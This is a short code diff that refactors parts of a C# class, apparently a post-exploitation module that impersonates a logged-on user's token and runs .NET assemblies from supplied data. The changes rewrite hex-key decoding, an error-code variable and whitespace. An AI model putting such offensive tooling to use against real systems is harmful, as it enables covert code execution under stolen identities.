@@ -9,6 +9,7 @@ using System.Security.Principal;
 
 using System.Reflection;
 using System.ComponentModel;
+using System.Globalization;
 
 
 public class Module_execute_assembly
@@ -36,7 +37,7 @@ public class Module_execute_assembly
 
         if (!ImpersonateLoggedOnUser(targetToken))
         {
-            var errorCode = Marshal.GetLastWin32Error();
+            int errorCode = Marshal.GetLastWin32Error();
             throw new Exception("ImpersonateLoggedOnUser failed with the following error: " + errorCode);
         }
 
@@ -189,14 +190,14 @@ public class Module_execute_assembly
         if (hex.Length % 2 == 1)
             throw new Exception("the binary key cannot have an odd number of digits");
 
-        byte[] arr = new byte[hex.Length >> 1];
-
-        for (int i = 0; i < hex.Length >> 1; ++i)
+        byte[] data = new byte[hex.Length / 2];
+        for (int index = 0; index < data.Length; index++)
         {
-            arr[i] = (byte)((getHexVal(hex[i << 1]) << 4) + (getHexVal(hex[(i << 1) + 1])));
+            string byteValue = hex.Substring(index * 2, 2);
+            data[index] = byte.Parse(byteValue, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
         }
 
-        return arr;
+        return data;
     }
 
     public string[] doExecuteAssembly(string as_filedata, string as_namespace, string as_class, string as_method, string[] as_args)
@@ -270,7 +271,7 @@ public class Module_execute_assembly
     {
         string result = "";
         List<string> nargs = new List<string>(args);
-		
+        
         if (nargs.Count != 5)
         {
             result += "Invalid arguments provided. Specify: <NET_ASSEMBLY> <ASSEMBLY_NAMESPACE> <ASSEMBLY_CLASS> <ASSEMBLY_METHOD> [ASSEMBLY_ARGS]" + Environment.NewLine;
